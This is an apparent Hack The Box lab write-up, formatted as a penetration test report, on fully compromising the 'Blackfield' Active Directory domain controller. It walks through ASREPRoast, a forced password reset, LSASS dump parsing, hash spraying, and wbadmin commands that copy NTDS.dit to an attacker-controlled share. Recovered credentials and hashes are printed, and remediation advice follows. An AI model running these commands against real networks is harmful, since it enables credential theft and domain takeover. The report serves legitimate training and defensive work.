# Penetration Test Report — Blackfield

![Difficulty](https://img.shields.io/badge/difficulty-Hard-red) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-ASREPRoast%20%2F%20LSASS%20%2F%20Backup%20Operators-black)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `BLACKFIELD.LOCAL`) enumerated domain users from an anonymously accessible `profiles$` share. An **ASREPRoast** attack recovered the password of `support`, whose *ForceChangePassword* right over `audit2020` unlocked a `forensic` share containing an **LSASS memory dump**. Extracted credentials yielded `svc_backup`, a Backup Operators member; **SeBackupPrivilege** was abused to exfiltrate the NTDS.dit database and SYSTEM hive, revealing the Administrator hash and full domain compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous SMB access to `profiles$` (user enumeration) | Medium |
| 2 | Kerberos pre-authentication disabled on `support` (ASREPRoast) | High |
| 3 | Excessive object control: `support` can reset `audit2020`'s password | High |
| 4 | LSASS dump accessible on a share (credentials in memory image) | Critical |
| 5 | Backup Operators member with WinRM access → NTDS.dit theft | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports target.htb
smbmap -u guest -H target.htb
```

DC for `BLACKFIELD.LOCAL`. Guest access to `profiles$` listed user-profile folders — a full username list:

```bash
smbclient -N \\\\target.htb\\profiles$ -c ls | awk '{ print $1 }' > users.txt
```

### 2. Foothold — ASREPRoast

```bash
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip target.htb \
  | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
john hash --format=krb5asrep
# support : #00^BlackKnight
```

BloodHound (`bloodhound-python -c DcOnly`) revealed `support` has **ForceChangePassword** over `audit2020`. Reset via rpcclient:

```bash
rpcclient -U blackfield/support target.htb
rpcclient $> setuserinfo audit2020 23 'H@CKTHEB0X#'
```

### 3. Lateral Movement — LSASS Dump

`audit2020` could read the `forensic` share, which held `lsass.zip`. Extracted and analyzed:

```bash
pip3 install pypykatz
pypykatz lsa minidump lsass.DMP
```

After verifying `lockoutThreshold = 0` (unlimited sprays), extracted NT hashes were sprayed with CrackMapExec:

```bash
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users
cme smb target.htb -u users -H hashes
# svc_backup : 9658d1d1dcd9250115e2205d9f48400d

evil-winrm -i target.htb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

`whoami /priv` confirmed **SeBackupPrivilege**.

### 4. Privilege Escalation — NTDS.dit Theft

`robocopy /b` recovered `notes.txt` from the Administrator desktop (revealing `root.txt` was EFS-encrypted — the Administrator *context* was required). The AD database was exfiltrated using wbadmin to an attacker-controlled authenticated Samba share:

```bash
# attacker: /etc/samba/smb.conf with [smb] path=/tmp, force user=smbuser
adduser smbuser && smbpasswd -a smbuser && service smbd restart
```

```powershell
net use k: \\<attacker-ip>\smb /user:smbuser smbpass
echo "Y" | wbadmin start backup -backuptarget:\\<attacker-ip>\smb -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<version> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
reg save HKLM\SYSTEM C:\system.hive
cp ntds.dit \\<attacker-ip>\smb\NTDS.dit
cp system.hive \\<attacker-ip>\smb\system.hive
```

Hashes extracted and Administrator shell obtained (wmiexec preserves the Administrator security context needed for EFS decryption):

```bash
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@target.htb
```

**Alternative:** use `diskshadow` to expose a shadow copy as `H:`, then `Copy-FileSeBackupPrivilege` (SeBackupPrivilege cmdlets) to copy `ntds.dit` and `SYSTEM` directly, followed by `secretsdump.py ... LOCAL`.

## Remediation

- Eliminate anonymous share access; restrict profile-share read permissions.
- Enforce Kerberos pre-authentication; alert on AS-REP roasting patterns.
- Tier and audit ForceChangePassword delegations.
- Protect LSASS (Credential Guard, PPL); restrict access to forensic artifacts.
- Remove interactive/remote logon from Backup Operators; monitor NTDS.dit access and wbadmin/diskshadow usage.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Discovery | T1087.002 — Domain Account (share-based user enum) |
| Credential Access | T1558.004 — AS-REP Roasting |
| Credential Access | T1003.001 — LSASS Memory |
| Collection | T1003.003 — NTDS |
| Privilege Escalation | T1078 / SeBackupPrivilege abuse |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
